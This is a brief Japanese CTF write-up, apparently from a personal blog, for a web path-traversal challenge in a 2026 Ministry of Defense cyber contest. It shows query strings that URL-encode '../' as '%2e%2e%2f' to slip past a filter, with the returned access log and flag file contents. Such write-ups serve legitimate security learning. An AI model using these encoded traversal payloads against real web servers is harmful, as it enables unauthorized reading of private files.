---
title: '越境パス - 防衛省サイバーコンテスト2026'
description: '防衛省サイバーコンテスト2026のWriteupです。'
pubDate: 2026-02-02
category: 'CTF'
tags: ['MODCC', 'Writeup', 'Web', 'injection']
---

# 越境パス
> `../` -> `%2e%2e%2f`  
URLエンコードして実行するとフィルターを回避できる

```bash
?file=%2e%2e%2f/flag.txt
FAKE_FLAG

?file=%2e%2e%2f/admin/logs/access.log
2024-12-01 10:15:23 - User accessed: readme.txt
2024-12-01 10:16:45 - User accessed: info.txt
2024-12-01 10:17:12 - User accessed: welcome.txt
2024-12-01 11:30:22 - Admin accessed: admin/readme.txt
2024-12-01 11:31:05 - Admin accessed: admin/config/secure/flag.txt
2024-12-01 11:45:33 - Suspicious activity detected: attempted ../
2024-12-01 11:45:34 - Access denied: blocked traversal attempt

?file=%2e%2e%2f/admin/config/secure/flag.txt
***
```